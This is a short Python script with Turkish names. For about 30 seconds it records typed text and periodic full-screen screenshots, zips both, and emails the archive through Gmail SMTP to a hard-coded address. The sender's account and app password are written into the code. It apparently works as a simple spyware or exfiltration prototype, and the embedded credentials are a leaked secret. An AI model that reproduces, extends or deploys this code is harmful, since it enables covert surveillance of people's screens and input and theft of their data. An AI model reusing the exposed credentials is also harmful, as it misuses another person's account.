import time
import os
from PIL import ImageGrab
import zipfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

def main():
    zaman = 30
    son_zaman = time.time() + zaman
    user_input = ""

    ekran_goruntusu = "screenshots"
    os.makedirs(ekran_goruntusu, exist_ok=True)
    ss_sayısı = 1

    while time.time() < son_zaman:
        new_input = input("Metin girin(1dk): ")
        user_input += new_input + "\n"

        if int(time.time()) % 5 == 0:
            ekran = ImageGrab.grab()
            screenshot_file = os.path.join(ekran_goruntusu, f"screenshot_{ss_sayısı}.png")
            ekran.save(screenshot_file)
            ss_sayısı += 1

    with open("kullanici_girdileri.txt", "w") as file:
        file.write(user_input)
    with zipfile.ZipFile("kullanici_verileri.zip", "w", zipfile.ZIP_DEFLATED) as archive:
        archive.write("kullanici_girdileri.txt")
        for screenshot_file in os.listdir(ekran_goruntusu):
            archive.write(os.path.join(ekran_goruntusu, screenshot_file))

    send_email("trendyol1tl@gmail.com", "aktasidris355@gmail.com", "fiicjybdqxkirxwn")

    print("Dosyalar e-posta olarak gönderildi.")

def send_email(from_email, to_email, password):
    subject = "Kullanıcı Verileri"
    body = "Kullanıcı girdileri ve ekran görüntüleri."

    message = MIMEMultipart()
    message["From"] = from_email
    message["To"] = to_email
    message["Subject"] = subject
    message.attach(MIMEBase("application", "zip"))

    filename = "kullanici_verileri.zip"
    attachment = open(filename, "rb")
    part = MIMEBase("application", "octet-stream")
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename={filename}")
    message.attach(part)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(from_email, password)
    text = message.as_string()
    server.sendmail(from_email, to_email, text)
    server.quit()

if __name__ == "__main__":
    main()
